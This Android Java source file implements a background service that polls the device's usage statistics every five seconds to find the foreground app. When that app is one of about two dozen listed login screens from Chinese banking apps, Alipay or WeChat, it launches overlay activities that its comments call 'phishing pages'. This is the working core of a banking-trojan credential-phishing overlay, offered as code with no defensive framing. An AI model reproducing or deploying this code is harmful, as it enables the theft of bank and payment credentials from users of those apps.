package com.example.pipdemo;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.app.Service;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import java.util.Calendar;

public class MonitorService extends Service {

    private Handler mHandler = null;
    private static final int POSTDELAYED_COUNTS = 5000;

    private static final String[] targetActivityArrays = {"com.yitong.mbank.psbc.module.login.view.activity.LoginPswActivity",
    "com.boc.bocsoft.mobile.bocmobile.buss.login.ui.LoginBaseActivity",
    "com.alipay.mobile.nebulacore.ui.H5Activity",
    "com.ccb.framework.security.touristlogin.view.TouristLoginActivity",
    "cmb.pb.app.mainframe.container.PBMainActivity",
    "com.pingan.user.ges.PasswordLoginActivity",
    "com.icbc.component.templatelogin.TemplateLoginActivity",
    "com.bankcomm.module.biz.webcontainer.BCMHtml5Activity",
    "com.ecitic.bank.mobile.ui.login.LoginActivity",
    "com.newland.app.ui.login.LoginActivity",
    "cn.com.spdb.mobilebank.per.activity.LoginActivity",
    "cn.com.cmbc.newmbank.login.view.activity.PwdLoginActivity",
    "com.cebbank.mobile.cemb.ui.activity.account.LoginActivity",
    "com.cgb.mobilebank.android.login.module.login.activity.LoginActivityV2",
    "com.yt.hxmb50.login.LoginActivity",
    "com.yitong.mobile.biz.launcher.app.login.LoginByNumberActivity",
    "com.yitong.mobile.biz.launcher.app.main.MainActivity",
    "com.yitong.mobile.biz.login.app.registerOrLogin.RegisterAndLoginActivity",
    "com.csii.iap.ui.LoginActivity",
    "cn.com.njcb.android.mobilebank.newnjcb.newlogin.NewFirstLoginActivity",
    "com.zybank.login.LoginActivity",
    "com.ali.user.mobile.loginupgrade.activity.LoginActivity",
    "com.alipay.android.msp.ui.views.MspContainerActivity",
    "com.tencent.mm.plugin.account.ui.LoginPasswordUI",
    "com.tencent.mm.framework.app.UIPageFragmentActivity"};

    public MonitorService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate(){
        super.onCreate();
        mHandler = new Handler();
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                //分析进程
                String fore = getForegroundClassName(getApplicationContext());
                for(String targetActivityArray:targetActivityArrays){
                    if(targetActivityArray.equals(fore)){
                        openPishingActivity();
                    }
                }
                mHandler.postDelayed(this, POSTDELAYED_COUNTS);
            }
        });
    }

    //打开钓鱼页面
    private void openPishingActivity(){
        //调出钓鱼界面
        Intent Call_intent = new Intent(this, CallOutActivity.class);
        Call_intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(Call_intent);

        Intent Main_intent = new Intent(this, MainActivity.class);
        Main_intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(Main_intent);

        Intent Test_intent = new Intent(this, TestActivity.class);
        Test_intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(Test_intent);
    }

    public static String getForegroundClassName(Context context) {
        //Get the app record in the last month
        Calendar calendar = Calendar.getInstance();
        final long end = calendar.getTimeInMillis();
        calendar.add(Calendar.MONTH, -1);
        final long start = calendar.getTimeInMillis();

        UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        UsageEvents usageEvents = usageStatsManager.queryEvents(start, end);
        UsageEvents.Event event = new UsageEvents.Event();
        String className = null;
        while (usageEvents.hasNextEvent()) {
            usageEvents.getNextEvent(event);
            if (event.getEventType() == UsageEvents.Event.ACTIVITY_RESUMED) {
                className = event.getClassName();
            }
        }
        return className;
    }
}